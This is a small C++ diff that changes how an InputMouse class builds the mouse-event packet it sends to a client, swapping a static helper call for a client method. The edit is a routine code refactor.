@@ -26,6 +26,7 @@ AInputType &InputMouse::operator>>(LogFile &logger)
 
 AInputType &InputMouse::operator>>(IClient &client)
 {
-	client << StaticTools::CreatePacket(PacketType::PT_MouseEvent, _format + "[MOUSE " + _data + "]");
+	//client << StaticTools::CreatePacket(PacketType::PT_MouseEvent, _format + "[MOUSE " + _data + "]");
+	client << client.createPacket(PacketType::PT_MouseEvent, _format + "[MOUSE " + _data + "]");
 	return (*this);
 }
